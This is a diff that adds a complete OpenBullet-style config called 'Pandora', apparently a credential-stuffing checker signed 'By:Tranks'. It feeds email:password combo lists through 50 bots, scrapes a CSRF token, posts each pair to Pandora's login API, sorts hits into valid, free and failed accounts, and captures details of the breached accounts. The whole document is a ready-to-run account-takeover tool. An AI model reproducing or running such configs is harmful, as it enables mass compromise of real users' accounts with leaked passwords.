@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Pandora",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-13T18:18:06.1804111+02:00",
+  "AdditionalInfo": "",
+  "Author": "Tranks",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#sign_in REQUEST GET "https://www.pandora.com/account/sign-in" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#TR PARSE "<COOKIES(csrftoken)>" LR "csrftoken:" "" -> VAR "token" 
+REQUEST POST "https://www.pandora.com/api/v1/auth/login" 
+  CONTENT "{\"existingAuthToken\":null,\"username\":\"<USER>\",\"password\":\"<PASS>\",\"keepLoggedIn\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "origin: https://www.pandora.com" 
+  HEADER "referer: https://www.pandora.com/account/sign-in" 
+  HEADER "X-CsrfToken: <COOKIES(csrftoken)>" 
+  HEADER "Connection: keep-alive" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username and/or password" 
+    KEY "AUTH_INVALID_USERNAME_PASSWORD" 
+  KEYCHAIN Success OR 
+    KEY "authToken\":\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "showUpgrade\",\"" 
+#Enjoy PARSE "<SOURCE>" LR "\",\"webname\":\"" "\",\"" -> CAP "Name" 
+#AN PARSE "<SOURCE>" LR "monthlyListeningCapHours\":" "}" -> CAP "Monthly Listening " "" " hours" 
+#KS PARSE "<SOURCE>" LR "branding\":\"" "\",\"" -> CAP "Sup" "" " | By:Tranks" 
